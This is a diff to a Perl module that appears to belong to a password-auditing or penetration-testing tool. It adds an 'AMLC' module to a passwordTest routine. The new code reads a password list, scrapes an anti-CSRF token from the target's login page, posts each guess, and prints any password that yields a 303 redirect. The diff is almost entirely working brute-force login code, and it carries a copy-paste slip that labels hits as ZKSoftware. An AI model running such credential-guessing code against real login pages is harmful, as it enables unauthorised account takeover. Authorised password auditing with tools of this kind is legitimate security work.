@@ -3,6 +3,7 @@ our $VERSION = '1.0';
 use Moose;
 use Term::ANSIColor;
 use Text::Table;
+use HTML::TreeBuilder;
 use LWP::UserAgent;
 use HTTP::Cookies;
 use URI::Escape;
@@ -853,6 +854,62 @@ sub passwordTest
 		close MYINPUT;	
 	}#ZKSoftware
 
+
+	if ($module eq "AMLC")
+	{
+		my @passwords_list = []; 
+		if ($passwords_file ne '' )
+		{
+			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
+			while (my $password=<MYINPUT>)
+			{ 						
+				push @passwords_list,$password; 
+			}
+		}
+		else
+		{
+			push @passwords_list,$password; 
+		}
+		
+
+		foreach my $password (@passwords_list) {
+			$password =~ s/\n//g; 	
+
+
+			my $response = $self->dispatch(url => $url.'index.php/login' ,method => 'GET', headers => $headers);
+			my $decoded_response = $response->decoded_content;			
+			$decoded_response =~ /data: \{ '(.*?)':/;
+			my $aj001sr001qwerty = $1; 
+
+			$decoded_response =~ /:'(.*?)' }}/;
+			my $token = $1; 
+			print "[+] aj001sr001qwerty:$aj001sr001qwerty token:$token \n";
+
+
+			my $hash_data = {'usu_login' => $user, 
+					'usu_password' => $password,
+					$aj001sr001qwerty => $token
+					};	
+		
+			my $post_data = convert_hash($hash_data);
+			
+
+					
+			$response = $self->dispatch(url => $url."login",method => 'POST',post_data =>$post_data, headers => $headers);
+			$decoded_response = $response->decoded_content;
+			my $status = $response->status_line;
+			
+			print "[+] user:$user password:$password status:$status\n";
+			#print($decoded_response);
+			if ($status =~ /303/m)
+			{				
+				print "Password encontrado: [ZKSoftware] $url Usuario:$user Password:$password\n";
+				last;				
+			}	
+		}				
+		close MYINPUT;	
+	}#AMLC
+
 	if ($module eq "owa")
 	{
 		my $counter = 1;	
@@ -1114,8 +1171,6 @@ sub passwordTest
 		}
 		close MYINPUT;	
 	}#phpmyadmin
-
-
 }
 
 #Extract redirect from HTML
